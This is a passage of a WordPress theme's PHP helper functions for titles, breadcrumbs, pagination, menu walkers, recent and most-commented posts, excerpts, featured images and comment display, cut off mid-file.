<?php

if ( ! function_exists( 'mp_theme_wp_title' ) ) :
///////////////////////////////////////////////////////////////////////////////////////
// Custom WP TITLE - original code ( twentytwelve_wp_title() ) - Credit to WordPress Team
///////////////////////////////////////////////////////////////////////////////////////
function mp_theme_wp_title( $title, $sep ) {
global $paged, $page;
$site_title = get_bloginfo( 'name' );
$post_title = the_title_attribute('echo=0');
$site_description = get_bloginfo( 'description', 'display' );
$sep = '&raquo;';
if ( is_feed() ) {
$title = $site_title;
} elseif ( $site_description && ( is_home() || is_front_page() ) ) {
$title = "$site_title $sep $site_description";
} elseif ( $paged >= 2 || $page >= 2 ) {
$title = "$site_title $sep " . sprintf( __( 'Page %s', TEMPLATE_DOMAIN ), max( $paged, $page ) );
} elseif ( is_category() || is_tag() ) {
$title = ucfirst( single_cat_title('',false) ) . ' ' . $sep . ' ' . $site_title;
} elseif ( is_singular() ) {
$title = "$post_title $sep $site_title";
} else {
if ( is_day() ) {
$title = __('Archives for ', TEMPLATE_DOMAIN) . get_the_date() . ' ' . $sep . ' ' . $site_title;
} else if ( is_month() ) {
$title = __('Archives for ', TEMPLATE_DOMAIN) . get_the_date('F Y') . ' ' . $sep . ' ' . $site_title;
} else if ( is_year() ){
$title = __('Archives for ', TEMPLATE_DOMAIN) . get_the_date('Y') . ' ' . $sep . ' ' . $site_title;
}
}
return $title;
}
if ( function_exists('aioseop_load_modules') || function_exists('wpseo_admin_init') ) {
} else {
add_filter( 'wp_title', 'mp_theme_wp_title', 10, 2 );
}
endif;



///////////////////////////////////////////////////////////////////////////////////////
// Custom WP Breadcrumbs
///////////////////////////////////////////////////////////////////////////////////////
function mp_the_breadcrumb() {
 global $post;
 $schema_on = '';
  $schema_link = '';
  $schema_prop_url = '';
  $schema_prop_title = '';

  $showOnHome = 1; // 1 - show breadcrumbs on the homepage, 0 - don't show
  $delimiter = ' &raquo; '; // delimiter between crumbs
  $home = __('Home', TEMPLATE_DOMAIN); // text for the 'Home' link
  $showCurrent = 1; // 1 - show current post/page title in breadcrumbs, 0 - don't show
  $before = '<span class="current">'; // tag before the current crumb
  $after = '</span>'; // tag after the current crumb
  $schema_breadcrumb_on = get_theme_option('schema_breadcrumbs_on');

  if($schema_breadcrumb_on == 'Enable') {
  $schema_link = ' itemscope itemtype="http://data-vocabulary.org/Breadcrumb"';
  $schema_prop_url = ' itemprop="url"';
  $schema_prop_title = ' itemprop="title"';
  }

  $homeLink = home_url();

  if ( is_home() || is_front_page()) {

  if ($showOnHome == 1) {

    echo '<div id="mpbreadcrumbs">';
    echo __('You are here: ', TEMPLATE_DOMAIN);
    echo '<span'. $schema_link . '><a'. $schema_prop_url . ' href="' . $homeLink . '">' . '<span'.$schema_prop_title.'>' . $home . '</span>' . '</a></span>';
    echo '</div>';

      }

  } else {

    echo '<div id="mpbreadcrumbs">';

    if( !is_single() ) { echo __('You are here: ', TEMPLATE_DOMAIN); }

    echo '<span'. $schema_link . '><a'. $schema_prop_url . ' href="' . $homeLink . '">' . '<span'.$schema_prop_title.'>' . $home . '</span>' . '</a></span>' . $delimiter . ' ';


    if ( is_category() ) {


      $thisCat = get_category(get_query_var('cat'), false);

      if ($thisCat->parent != 0) {

      $category_link = get_category_link( $thisCat->parent );

       echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . $category_link . '">' . '<span'.$schema_prop_title.'>' . get_cat_name( $thisCat->parent ) . '</span>' . '</a></span>' . $delimiter . ' ';

     }

      $category_id = get_cat_ID( single_cat_title('', false) );
      $category_link = get_category_link( $category_id );

      echo '<span'. $schema_link . '"><a'.$schema_prop_url.' href="' . $category_link . '">' . '<span'.$schema_prop_title.'>' . single_cat_title('', false) . '</span>' . '</a></span>';


    } elseif ( is_search() ) {

      echo __('Search results for', TEMPLATE_DOMAIN) . ' "' . get_search_query() . '"';

    } elseif ( is_day() ) {

      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_year_link(get_the_time('Y')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('Y') . '</span>' . '</a></span>' . $delimiter . ' ';

     echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('F') . '</span>' . '</a></span>' . $delimiter . ' ';


    echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_day_link(get_the_time('Y'),get_the_time('m'),get_the_time('d')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('d') . '</span>' . '</a></span>';


    } elseif ( is_month() ) {

      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_year_link(get_the_time('Y')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('Y') . '</span>' . '</a></span>' . $delimiter . ' ';

      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('F') . '</span>' . '</a></span>';


    } elseif ( is_year() ) {


      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_year_link(get_the_time('Y')) . '">' . '<span'.$schema_prop_title.'>' . get_the_time('Y') . '</span>' . '</a></span>';


    } elseif ( is_single() && !is_attachment() ) {

      if ( get_post_type() != 'post' ) {
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;

       echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . $homeLink . '/' . $slug['slug'] . '">' . '<span'.$schema_prop_title.'>' . $post_type->labels->singular_name . '</span>' . '</a></span>';


// get post type by post
$post_type = $post->post_type;
// get post type taxonomies
$taxonomies = get_object_taxonomies( $post_type, 'objects' );
if($taxonomies) {
foreach ( $taxonomies as $taxonomy_slug => $taxonomy ){
// get the terms related to post
$terms = get_the_terms( $post->ID, $taxonomy_slug );
if ( !empty( $terms ) ) {
foreach ( $terms as $term ) {
$taxlist .= ' '. $delimiter . ' ' . '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_term_link( $term->slug, $taxonomy_slug ) . '">' . '<span'.$schema_prop_title.'>' . ucfirst($term->name) . '</span>' . '</a></span>';
}
}
}
if($taxlist) { echo $taxlist; }
}
      echo ' '. $delimiter . ' ' . __('You are reading &raquo;', TEMPLATE_DOMAIN);

      } else {

      $category = get_the_category();
      if ($category) {

      foreach ($category as $cat ) {

        echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_category_link( $cat->term_id ) . '">' . '<span'.$schema_prop_title.'>' . $cat->name  . '</span>' . '</a></span>' . $delimiter . ' ';

 }
      }

      echo __('You are reading &raquo;', TEMPLATE_DOMAIN);
      }


    } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {

      $post_type = get_post_type_object(get_post_type());
      echo $before . $post_type->labels->singular_name . $after;

    } elseif ( is_attachment() ) {

      $parent = get_post($post->post_parent);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');

      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink($parent) . '">' . '<span'.$schema_prop_title.'>' . $parent->post_title  . '</span>' . '</a></span>';

      if ($showCurrent == 1) echo ' ' . $delimiter . ' ' . $before . get_the_title() . $after;

    } elseif ( is_page() && !$post->post_parent ) {

    if( class_exists('buddypress') ) {
    global $bp;

    if( bp_is_groups_component() ){
     echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . home_url() . '/' . bp_get_root_slug( 'groups' ) . '">' . '<span'.$schema_prop_title.'>' . bp_get_root_slug( 'groups' ) . '</span>' . '</a></span>';

    if( !bp_is_directory()) {
     echo $delimiter.'<span'. $schema_link . '><a'.$schema_prop_url.' href="' . home_url() . '/' . bp_get_root_slug( 'groups' ) . '/'.  bp_current_item() . '">' . '<span'.$schema_prop_title.'>' . bp_current_item() . '</span>' . '</a></span>';
if( bp_current_action() ) {
    echo $delimiter.'<span'. $schema_link . '><a'.$schema_prop_url.' href="' . home_url() . '/' . bp_get_root_slug( 'groups' ) . '/'.  bp_current_item() . '/' . bp_current_action() . '">' . '<span'.$schema_prop_title.'>' . bp_current_action() . '</span>' . '</a></span>';
}
             }

} else if( bp_is_members_directory() ){

     echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . home_url() . '/' . bp_get_root_slug( 'members' ) . '">' . '<span'.$schema_prop_title.'>' . bp_get_root_slug( 'members' ) . '</span>' . '</a></span>';


} else if( bp_is_user() ){

     echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . home_url() . '/' . bp_get_root_slug( 'members' ) . '">' . '<span'.$schema_prop_title.'>' . bp_get_root_slug( 'members' ) . '</span>' . '</a></span>';


     echo $delimiter.'<span'. $schema_link . '><a'.$schema_prop_url.' href="' . bp_core_get_user_domain( $bp->displayed_user->id )  . '">' . '<span'.$schema_prop_title.'>' . bp_get_displayed_user_username() . '</span>' . '</a></span>';


  if( bp_current_action() ) {
    echo $delimiter.'<span'. $schema_link . '><a'.$schema_prop_url.' href="' . bp_core_get_user_domain( $bp->displayed_user->id ) . bp_current_component() . '">' . '<span'.$schema_prop_title.'>' . bp_current_component() . '</span>' . '</a></span>';
}


} else {

     if( bp_is_directory()) {
    echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink() . '">' . '<span'.$schema_prop_title.'>' . bp_current_component() . '</span>' . '</a></span>';
          } else {
       echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink() . '">' . '<span'.$schema_prop_title.'>' . the_title_attribute('echo=0') . '</span>' . '</a></span>';
       }
}


 }  else {

  echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink() . '">' . '<span'.$schema_prop_title.'>' . the_title_attribute('echo=0') . '</span>' . '</a></span>';
 }


    } elseif ( is_page() && $post->post_parent ) {

      $parent_id  = $post->post_parent;
      $breadcrumbs = array();

      while ($parent_id) {

      $page = get_page($parent_id);

        $breadcrumbs[] = '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink($page->ID) . '">' . '<span'.$schema_prop_title.'>' . get_the_title($page->ID)  . '</span>' . '</a></span>';

        $parent_id  = $page->post_parent;
      }

      $breadcrumbs = array_reverse($breadcrumbs);
      for ($i = 0; $i < count($breadcrumbs); $i++) {
        echo $breadcrumbs[$i];
        if ($i != count($breadcrumbs)-1) echo ' ' . $delimiter . ' ';

      }


      echo $delimiter . '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_permalink() . '">' . '<span'.$schema_prop_title.'>' . the_title_attribute('echo=0') . '</span>' . '</a></span>';

    } elseif ( is_tag() ) {

      $tag_id = get_term_by('name', single_cat_title('', false), 'post_tag');
      if($tag_id) { $tag_link = get_tag_link( $tag_id->term_id ); }

      echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . $tag_link . '">' . '<span'.$schema_prop_title.'>' . single_cat_title('', false) . '</span>' . '</a></span>';


    } elseif ( is_author() ) {

       global $author;
      $userdata = get_userdata($author);

     echo '<span'. $schema_link . '><a'.$schema_prop_url.' href="' . get_author_posts_url( $userdata->ID ) . '">' . '<span'.$schema_prop_title.'>' . $userdata->display_name  . '</span>' . '</a></span>';


    } elseif ( is_404() ) {

      echo ' '. $delimiter . ' ' . __('Error 404', TEMPLATE_DOMAIN);

    }

    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      echo ' '. $delimiter . ' ' . __('Page', TEMPLATE_DOMAIN) . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }

    echo '</div>';

  }
}


// get taxonomies terms links
function custom_taxonomies_terms_links($before='',$after='') {
global $post, $post_id;
// get post by post id
$post = get_post( $post->ID );
// get post type by post
$post_type = $post->post_type;
// get post type taxonomies
$taxonomies = get_object_taxonomies( $post_type, 'objects' );
$out = '';
foreach ( $taxonomies as $taxonomy_slug => $taxonomy ){
// get the terms related to post
$terms = get_the_terms( $post->ID, $taxonomy_slug );

if ( !empty( $terms ) ) {
foreach ( $terms as $term ) {
$taxlist .= '<a href="'.get_term_link( $term->slug, $taxonomy_slug ) .'">'.$term->name."</a>, ";
}
$out .= substr( $taxlist,0,-2 );
}
}
if($out) {
return $before . $out . $after;
}
}


///////////////////////////////////////////////////////////////////////////////////////
// Custom WP Pagination original code ( kriesi_pagination() ) - Credit to kriesi code
// http://www.kriesi.at/archives/how-to-build-a-wordpress-post-pagination-without-plugin
///////////////////////////////////////////////////////////////////////////////////////
function mp_custom_kriesi_pagination($pages = '', $range = 2) {
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '') {
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages) {
$pages = 1;
}
}

if(1 != $pages) {
echo "<div class='wp-pagenavi iegradient'>";
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";
for ($i=1; $i <= $pages; $i++) {
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
}
}
if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";
if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
echo "</div>\n";
}
}



if( !class_exists('Custom_Description_Walker') ):
////////////////////////////////////////////////////////////////////
// add description to wp_nav
///////////////////////////////////////////////////////////////////
class Custom_Description_Walker extends Walker_Nav_Menu {
    /**
     * Start the element output.
     *
     * @param  string $output Passed by reference. Used to append additional content.
     * @param  object $item   Menu item data object.
     * @param  int $depth     Depth of menu item. May be used for padding.
     * @param  array $args    Additional strings.
     * @return void
     */
function start_el(&$output, $item, $depth, $args) {
$classes = empty ( $item->classes ) ? array () : (array) $item->classes;
$class_names = join(' ', apply_filters('nav_menu_css_class',array_filter( $classes ), $item)
);


! empty ( $class_names )
and $class_names = ' class="'. esc_attr( $class_names ) . '"';
$output .= "<li id='menu-item-$item->ID' $class_names>";

$attributes  = '';

        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';


$title = apply_filters( 'the_title', $item->title, $item->ID );
$item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a> '
            . $args->link_after
            . $args->after;

// Since $output is called by reference we don't need to return anything.
$output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
}
endif;


///////////////////////////////////////////////////////////////////////////////
// custom walker nav for mobile navigation
///////////////////////////////////////////////////////////////////////////////
class mobi_custom_walker extends Walker_Nav_Menu
{
function start_el(&$output, $item, $depth, $args)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . '"';

           $output .= $indent . '';



           $prepend = '';
           $append = '';
         //$description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

           if($depth != 0)
           {
           $description = $append = $prepend = "";
           }

            $item_output = $args->before;

            if($depth == 1):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;-- " . $item->title . "</option>";
            elseif($depth == 2):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- " . $item->title . "</option>";
            elseif($depth == 3):
            $item_output .= "<option value='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- " . $item->title . "</option>";
            else:
            $item_output .= "<option value='" . $item->url . "'>" . $item->title . "</option>";
            endif;

            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
            }
}



function get_wp_custom_mobile_nav_menu($get_custom_location='', $get_default_menu=''){
$options = array('walker' => new mobi_custom_walker(), 'theme_location' => "$get_custom_location", 'menu_id' => '', 'echo' => false, 'container' => false, 'container_id' => '', 'fallback_cb' => "$get_default_menu");
$menu = wp_nav_menu($options);
$menu_list = preg_replace( '#^<ul[^>]*>#', '', $menu );
$menu_list2 = str_replace( array('<ul class="sub-menu">','<ul>','</ul>','</li>'), '', $menu_list );
return $menu_list2;
}


function revert_wp_mobile_menu_page() {
global $wpdb;
$qpage = $wpdb->get_results( "SELECT * FROM " . $wpdb->prefix . "posts WHERE post_type='page' AND post_status='publish' ORDER by ID");
foreach ($qpage as $ipage ) {
echo "<option value='" . get_permalink( $ipage->ID ) . "'>" . $ipage->post_title . "</option>";
}
}


function get_mobile_navigation($type='', $nav_name='') {
$id = $type . "-dropdown";
$js = '<script type="text/javascript">jQuery(document).ready(function(jQuery){ jQuery("select#'. $id . '").change(function(){ window.location.href = jQuery(this).val();});});</script>';
echo $js;
echo "<select name='". $id . "' id='". $id . "'>";
echo "<option>" . __('Where to?', TEMPLATE_DOMAIN) . "</option>"; ?>
<?php echo get_wp_custom_mobile_nav_menu($get_custom_location=$nav_name, $get_default_menu='revert_wp_mobile_menu_page'); ?>
<?php echo "</select>"; }


if( !function_exists( 'get_browser_body_class' )):
////////////////////////////////////////////////////////////////////
// Browser Detect
///////////////////////////////////////////////////////////////////
function get_browser_body_class($classes) {
global $socialon, $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
$socialon = get_theme_option('social_on');
if($is_lynx) $classes[] = 'lynx';
elseif($is_gecko) $classes[] = 'gecko';
elseif($is_opera) $classes[] = 'opera';
elseif($is_NS4) $classes[] = 'ns4';
elseif($is_safari) $classes[] = 'safari';
elseif($is_chrome) $classes[] = 'chrome';
elseif($is_IE) $classes[] = 'ie';
else $classes[] = 'unknown';
if($is_iphone) $classes[] = 'iphone';
return $classes;
}
add_filter('body_class','get_browser_body_class');
endif;



if( !function_exists( 'get_avatar_recent_comment' )):
////////////////////////////////////////////////////////////////////////////////
// Get Recent Comments With Avatar
////////////////////////////////////////////////////////////////////////////////
function get_avatar_recent_comment($limit) {
global $wpdb;
$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID,
comment_post_ID, comment_author, comment_author_email, comment_date_gmt, comment_approved,
comment_type,comment_author_url, SUBSTRING(comment_content,1,80) AS com_excerpt FROM $wpdb->comments
LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID =
$wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND
post_password = '' ORDER BY comment_date_gmt DESC LIMIT " . $limit;
echo '<ul class="gravatar_recent_comment nolist">';
$comments = $wpdb->get_results($sql);
$gravatar_status = 'on'; /* off if not using */
foreach ($comments as $comment) {
$grav_email = $comment->comment_author_email;
$grav_name = $comment->comment_author;
$grav_url = "http://www.gravatar.com/avatar.php?gravatar_id=".md5($grav_email). "&amp;size=32"; ?>

<li>
<?php if($gravatar_status == 'on') { ?>
<?php echo get_avatar( $grav_email, '120'); ?>
<?php } ?>
<div class="gravatar-meta">
<span class="author"><span class="aname"><?php echo strip_tags($comment->comment_author); ?></span> - </span>
<span class="comment"><a href="<?php echo get_permalink($comment->ID); ?>#comment-<?php echo $comment->comment_ID; ?>" title="<?php __('on', TEMPLATE_DOMAIN); ?> <?php echo $comment->post_title; ?>"><?php echo strip_tags($comment->com_excerpt); ?>...</a></span>
</div>
</li>
<?php
}
echo '</ul>';
}
endif;

if( !function_exists( 'get_hot_topics' )):
////////////////////////////////////////////////////////////////////////////////
// Most Comments
////////////////////////////////////////////////////////////////////////////////
function get_hot_topics($limit) {
global $wpdb, $post;
$mostcommenteds = $wpdb->get_results("SELECT  $wpdb->posts.ID, post_title, post_name, post_date, COUNT($wpdb->comments.comment_post_ID) AS 'comment_total' FROM $wpdb->posts LEFT JOIN $wpdb->comments ON $wpdb->posts.ID = $wpdb->comments.comment_post_ID WHERE comment_approved = '1' AND post_date_gmt < '".gmdate("Y-m-d H:i:s")."' AND post_status = 'publish' AND post_password = '' GROUP BY $wpdb->comments.comment_post_ID ORDER  BY comment_total DESC LIMIT " . $limit);
echo '<ul class="most-commented">';
foreach ($mostcommenteds as $post) {
$post_title = htmlspecialchars(stripslashes($post->post_title));
$comment_total = (int) $post->comment_total;
echo "<li><a href=\"".get_permalink()."\">$post_title</a><span class=\"total-com\">&nbsp;($comment_total)</span></li>";
}
echo '</ul>';
}
endif;


function mp_get_random_post($limit) {
$allposttype = mp_get_all_posttype();
echo '<ul>';
query_posts( array( 'posts_per_page' => $limit, 'ignore_sticky_posts' => 1, 'orderby' => 'rand') );
while ( have_posts() ) : the_post();
echo '<li>';
echo '<a href="' .  get_permalink() . '" title="' . the_title_attribute('echo=0') . '">' . get_the_title() . '</a>';
echo '</li>';
endwhile; wp_reset_query();
echo '</ul>';
}


if( !function_exists( 'get_short_feat_title' )):
////////////////////////////////////////////////////////////////////////////////
// Get Short Featured Title
////////////////////////////////////////////////////////////////////////////////
function get_short_feat_title($limit) {
 $title = get_the_title();
 $count = strlen($title);
 if ($count >= $limit) {
 $title = substr($title, 0, $limit);
 $title .= '...';
 }
 echo $title;
}
endif;


if( !function_exists( 'get_short_text' )):
////////////////////////////////////////////////////////////////////////////////
// Get Short Excerpt
////////////////////////////////////////////////////////////////////////////////
function get_short_text($text='', $wordcount='') {
$text_count = strlen( $text );
if ( $text_count <= $wordcount ) {
$text = $text;
} else {
$text = substr( $text, 0, $wordcount );
$text = $text . '...';
}
return $text;
}
endif;


////////////////////////////////////////////////////////////////////////////////
// excerpt the_content()
////////////////////////////////////////////////////////////////////////////////
function get_custom_the_excerpt($limit='',$more='') {
global $post;
$thepostlink = '<a class="readmore" href="'. get_permalink() . '" title="' . the_title_attribute('echo=0') . '">';
$custom_text = get_post_meta($post->ID,'post_custom_text',true);
if($custom_text) {
if($more) {
    $excerpt = $custom_text . $thepostlink . $more . '</a>';
    } else {
    $excerpt = $custom_text;
    }
return $excerpt;

} else {

$content = wp_strip_all_tags(get_the_content() , true );
//remove caption tag
$content_filter = preg_replace('`\[[^\]]*\]`','',$content);
//remove email tag
$pattern = "/[^@\s]*@[^@\s]*\.[^@\s]*/";
$replacement = "";
$content_filter = preg_replace($pattern, $replacement, $content_filter);
//remove link url tag
$pattern = "/[a-zA-Z]*[:\/\/]*[A-Za-z0-9\-_]+\.+[A-Za-z0-9\.\/%&=\?\-_]+/i";
$replacement = "";
$content_filter = preg_replace($pattern, $replacement, $content_filter);

if($more) {
    $excerpt = wp_trim_words($content_filter, $limit) . $thepostlink.$more.'</a>';
    } else {
    $excerpt = wp_trim_words($content_filter, $limit);
    }
return $excerpt;
}
}



if( !function_exists( 'get_custom_the_content' )):
function get_custom_the_content($limit) {
global $id, $post;
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  $content = strip_tags($content, '<p>');
  return $content;
}
endif;


if( !function_exists('get_the_content_with_format') ):
function get_the_content_with_format ($more_link_text = '', $stripteaser = 0, $more_file = '') {
$content = get_the_content($more_link_text, $stripteaser, $more_file);
$content = apply_filters('the_content', $content);
$content = strip_tags($content, '<p><a>');
return $content;
}
endif;


function get_check_more_content($text) {
global $post;
if( strstr($post->post_content,'<!--more-->')) {
return get_the_content_with_format( $more_link_text = $text );
} else {
return get_custom_the_excerpt(50);
}
}

////////////////////////////////////////////////////////////////////////////////
// remove http or https
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('remove_http') ):
function remove_http($url) {
$disallowed = array('http://', 'https://');
foreach($disallowed as $d) {
if(strpos($url, $d) === 0) {
return str_replace($d, '', $url);
}
}
return $url;
}
endif;

function mp_get_image_alt_text() {
global $wpdb, $post, $posts;
$image_id = get_post_thumbnail_id( get_the_ID() );
$image_alt = get_post_meta($image_id, '_wp_attachment_image_alt', true);
if( $image_alt ) {
return $image_alt;
} else {
return the_title_attribute('echo=0');
}
}

////////////////////////////////////////////////////////////////////////////////
// get featured images
////////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_featured_post_image' )):
function get_featured_post_image($before,$after,$width,$height,$class,$size,$alt,$title,$default) { //$size - full, large, medium, thumbnail
global $blog_id,$wpdb, $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if( isset($matches[1][0] ) ):
$first_img = $matches[1][0];
endif;

if( has_post_thumbnail( $post->ID ) ) {

return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $image_url . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

if($first_img) {
return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $first_img . "' alt='" . $alt . "' title='" . $title . "' />" . $after;
} else {

if($default == 'true'):
return $before . "<img width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . get_template_directory_uri() . '/images/post-default.jpg' . "' alt='" . $alt . "' title='" . $title . "' />" . $after;
endif;

}

}

}
endif;




////////////////////////////////////////////////////////////////////////////////
// get featured images
////////////////////////////////////////////////////////////////////////////////
if( !function_exists( 'get_featured_post_image_src' )):
function get_featured_post_image_src($before,$after,$size,$default) { //$size - full, large, medium, thumbnail
global $blog_id,$wpdb, $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if( isset($matches[1][0] ) ):
$first_img = $matches[1][0];
endif;

if( has_post_thumbnail( $post->ID ) ) {

return $before  . $image_url . $after;

} else {

if($first_img) {
return $before . $first_img . $after;
} else {

if($default == 'true'):
return $before  . get_template_directory_uri() . '/images/post-default.jpg' . $after;
endif;

}

}

}
endif;


if( !function_exists( 'get_post_id_outside_loop' )):
////////////////////////////////////////////////////////////////////////////////
// Get Post Page ID Outside loop
////////////////////////////////////////////////////////////////////////////////
function get_post_id_outside_loop() {
global $wp_query;
$thePostID = $wp_query->post->ID;
return $thePostID;
}
endif;


if( !function_exists( 'get_has_thumb_class' )):
////////////////////////////////////////////////////////////////////////////////
// Check if post has thumbnail attached
////////////////////////////////////////////////////////////////////////////////
function get_has_thumb_class($classes) {
global $post;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if( isset($matches[1][0] ) ):
$first_img = $matches[1][0];
endif;

if( has_post_thumbnail($post->ID) || !empty($first_img) ) {
$classes[] = 'has_thumb';
} else {
$classes[] = 'has_no_thumb';
}

return $classes;
}
add_filter('post_class', 'get_has_thumb_class');
endif;



if( !function_exists( 'get_has_thumb' )):
////////////////////////////////////////////////////////////////////////////////
// Check if post has thumbnail attached
////////////////////////////////////////////////////////////////////////////////
function get_has_thumb() {
global $post;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
if( isset($matches[1][0] ) ):
$first_img = $matches[1][0];
endif;
if( has_post_thumbnail($post->ID) || !empty($first_img) ) {
$thumb = 'has_thumb';
}
return $thumb;
}
endif;


if( !function_exists( 'get_the_list_comments' )):
////////////////////////////////////////////////////////////////////////////////
// wp_list_comment
////////////////////////////////////////////////////////////////////////////////
function get_the_list_comments($comment, $args, $depth) {
global $bp_existed; $GLOBALS['comment'] = $comment; ?>
<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
<div class="comment-body" id="div-comment-<?php comment_ID(); ?>">
<?php if($bp_existed == 'true') { // check if bp existed  ?>
<?php echo bp_core_fetch_avatar( array( 'item_id' => $comment->user_id, 'width' => 52, 'height' => 52, 'email' => $comment->comment_author_email ) ); ?>
<?php } else { ?>
<?php echo get_avatar( $comment, 52 ) ?>
<?php } ?>
<div class="comment-author vcard">

<div class="comment-post-meta">
<cite class="fn"><?php comment_author_link() ?></cite> <span class="says">-</span> <small><a href="#comment-<?php comment_ID() ?>"><?php comment_date(__('F jS, Y', TEMPLATE_DOMAIN)) ?> <?php _e("at",TEMPLATE_DOMAIN); ?> <?php comment_time() ?>
</a></small>
</div>

<div id="comment-text-<?php comment_ID(); ?>" class="comment_text">
<?php if ($comment->comment_approved == '0') : ?>
<em><?php _e('Your comment is awaiting moderation.', TEMPLATE_DOMAIN); ?></em>
<?php endif; ?>
<?php comment_text() ?>
<div class="reply">
<?php comment_reply_link(array_merge( $args, array('add_below'=> 'comment-text', 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
</div>
</div>
</div>
</div>
<?php
}
endif;

if( !function_exists( 'get_the_list_pings' )):
